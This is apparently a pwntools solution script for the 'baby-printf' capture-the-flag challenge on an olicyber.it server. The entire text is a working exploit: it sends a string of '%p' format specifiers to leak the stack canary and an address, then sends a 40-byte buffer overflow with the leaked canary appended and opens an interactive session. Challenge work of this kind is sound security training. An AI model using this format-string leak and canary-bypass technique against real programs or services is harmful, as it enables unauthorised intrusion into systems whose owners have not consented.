from pwn import *

if args.REMOTE:
    r = remote("baby-printf.challs.olicyber.it", 34004)
else:
    r = gdb.debug("./babyprintf", '''b main''')

r.recvuntil(b"back:")
r.sendline(b"%p"*18 + b" ")
print(r.recvuntil(b"0x70257025702570250x70257025702570250x70257025702570250x70257025702570250xa2070257025"))
canary = bytes.fromhex(r.recv(18)[2:].decode())
r.recvuntil(b"0x")
r.recvuntil(b"0x")

leaked_addr = r.recvuntil(b"0x")[:-2]
print("leaked_addr: ", leaked_addr)
print("canary: ", p64(int.from_bytes(canary)))

r.sendline(b"A"*40 + p64(int.from_bytes(canary)))
r.interactive()